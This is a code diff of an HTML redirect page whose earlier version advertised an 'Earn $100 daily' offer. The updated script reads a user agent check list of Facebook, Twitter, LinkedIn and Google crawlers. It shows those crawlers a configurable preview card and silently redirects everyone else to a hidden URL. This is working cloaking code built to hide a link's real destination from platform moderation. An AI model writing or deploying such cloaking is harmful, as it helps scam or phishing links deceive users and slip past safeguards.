@@ -3,37 +3,164 @@
 <head>
   <meta charset="UTF-8" />
   <script src="config.js"></script>
-  <meta property="og:title" content="Earn $100 daily" />
-  <meta property="og:description" content="Check out this amazing offer and start earning today!" />
-  <meta property="og:image" content="https://i.imghippo.com/files/gbuB7452ddM.png">
-  <meta property="og:url" content="https://rajonbd1.github.io/bestone/" />
-  <title>Redirecting...</title>
+  <meta property="og:title" content="" id="ogTitle" />
+  <meta property="og:description" content="" id="ogDescription" />
+  <meta property="og:image" content="" id="ogImage">
+  <meta property="og:url" content="" id="ogUrl" />
+  <meta property="og:type" content="website" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="" id="twitterTitle" />
+  <meta name="twitter:description" content="" id="twitterDescription" />
+  <meta name="twitter:image" content="" id="twitterImage" />
+  <title id="pageTitle">Redirecting...</title>
   <script>
-    const ua = navigator.userAgent;
-    const isFacebookCrawler = (
-        ua.includes('facebookexternalhit') ||
-        ua.includes('Facebot') ||
-        ua.includes('facebookplatform')
-    );
+    // Initialize page with configuration
+    function initializePage() {
+      // Set meta tags dynamically
+      document.getElementById('ogTitle').setAttribute('content', CONFIG.OG_TITLE || '');
+      document.getElementById('ogDescription').setAttribute('content', CONFIG.OG_DESCRIPTION || '');
+      document.getElementById('ogImage').setAttribute('content', CONFIG.OG_IMAGE_URL || '');
+      document.getElementById('ogUrl').setAttribute('content', CONFIG.OG_URL || '');
+
+      // Set Twitter meta tags
+      document.getElementById('twitterTitle').setAttribute('content', CONFIG.OG_TITLE || '');
+      document.getElementById('twitterDescription').setAttribute('content', CONFIG.OG_DESCRIPTION || '');
+      document.getElementById('twitterImage').setAttribute('content', CONFIG.OG_IMAGE_URL || '');
+
+      // Set page title
+      document.getElementById('pageTitle').textContent = CONFIG.PAGE_TITLE || 'Redirecting...';
+
+      // Apply custom CSS if provided
+      if (CONFIG.CUSTOM_CSS) {
+        const style = document.createElement('style');
+        style.textContent = CONFIG.CUSTOM_CSS;
+        document.head.appendChild(style);
+      }
+
+      // Set security headers if enabled
+      if (CONFIG.SECURITY && CONFIG.SECURITY.strictReferrer) {
+        const meta = document.createElement('meta');
+        meta.name = 'referrer';
+        meta.content = 'strict-origin-when-cross-origin';
+        document.head.appendChild(meta);
+      }
+    }
+
+    // Enhanced crawler detection
+    function isCrawler() {
+      const ua = navigator.userAgent.toLowerCase();
+      const crawlers = [];
+
+      if (CONFIG.CRAWLER_DETECTION) {
+        if (CONFIG.CRAWLER_DETECTION.facebook) {
+          crawlers.push('facebookexternalhit', 'facebot', 'facebookplatform');
+        }
+        if (CONFIG.CRAWLER_DETECTION.twitter) {
+          crawlers.push('twitterbot');
+        }
+        if (CONFIG.CRAWLER_DETECTION.linkedin) {
+          crawlers.push('linkedinbot');
+        }
+        if (CONFIG.CRAWLER_DETECTION.google) {
+          crawlers.push('googlebot', 'google-structured-data-testing-tool');
+        }
+      }
+
+      return crawlers.some(crawler => ua.includes(crawler));
+    }
 
     function doRedirect() {
-        window.location.replace(CONFIG.REDIRECT_URL);
+      // Validate HTTPS if required
+      if (CONFIG.SECURITY && CONFIG.SECURITY.httpsOnly && !CONFIG.REDIRECT_URL.startsWith('https://')) {
+        console.error('HTTPS-only mode enabled but redirect URL is not HTTPS');
+        return;
+      }
+
+      window.location.replace(CONFIG.REDIRECT_URL);
     }
 
-    if (!isFacebookCrawler) {
-        setTimeout(doRedirect, CONFIG.REDIRECT_DELAY_MS);
-    } else {
-        console.log("Facebook crawler detected - no redirect.");
-    }
+    // Initialize page when config is loaded
+    if (typeof CONFIG !== 'undefined') {
+      initializePage();
 
-    
+      if (!isCrawler()) {
+        setTimeout(doRedirect, CONFIG.REDIRECT_DELAY_MS || 2000);
+      } else {
+        console.log("Crawler detected - no redirect.");
+      }
+    }
   </script>
 </head>
 <body>
-  <p>Redirecting you shortly...</p>
-  <img id="displayImage" src="" alt="Display Image" style="max-width: 100%; height: auto; display: block; margin: 20px auto;">
+  <div class="redirect-container">
+    <p id="redirectMessage">Redirecting you shortly...</p>
+    <img id="displayImage" src="" alt="Display Image" style="max-width: 100%; height: auto; display: block; margin: 20px auto;">
+    <div class="loading-spinner" style="display: none;">
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      margin: 0;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .redirect-container {
+      text-align: center;
+      max-width: 600px;
+      padding: 2rem;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 15px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+    }
+
+    #redirectMessage {
+      font-size: 1.2rem;
+      margin-bottom: 1rem;
+    }
+
+    #displayImage {
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    .spinner {
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top: 3px solid white;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+
   <script>
-    document.getElementById('displayImage').src = CONFIG.DISPLAY_IMAGE_URL;
+    // Update content when config is available
+    if (typeof CONFIG !== 'undefined') {
+      document.getElementById('redirectMessage').textContent = CONFIG.REDIRECT_MESSAGE || 'Redirecting you shortly...';
+
+      if (CONFIG.DISPLAY_IMAGE_URL) {
+        document.getElementById('displayImage').src = CONFIG.DISPLAY_IMAGE_URL;
+        document.getElementById('displayImage').style.display = 'block';
+      } else {
+        document.getElementById('displayImage').style.display = 'none';
+      }
+    }
   </script>
-  </body>
+</body>
 </html>
